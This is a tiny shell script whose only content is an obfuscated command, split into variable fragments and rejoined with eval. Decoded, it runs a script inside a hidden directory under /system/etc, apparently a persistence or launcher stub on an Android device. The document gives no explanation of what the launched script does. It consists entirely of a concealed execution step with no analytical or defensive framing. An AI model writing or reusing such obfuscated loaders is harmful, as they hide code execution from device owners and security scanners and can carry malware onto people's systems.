z="
";Cz='em/e';Ez='mpf_';Hz='h';Az='sh /';Bz='syst';Dz='tc/.';Fz='fc/M';Gz='PF.s';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz"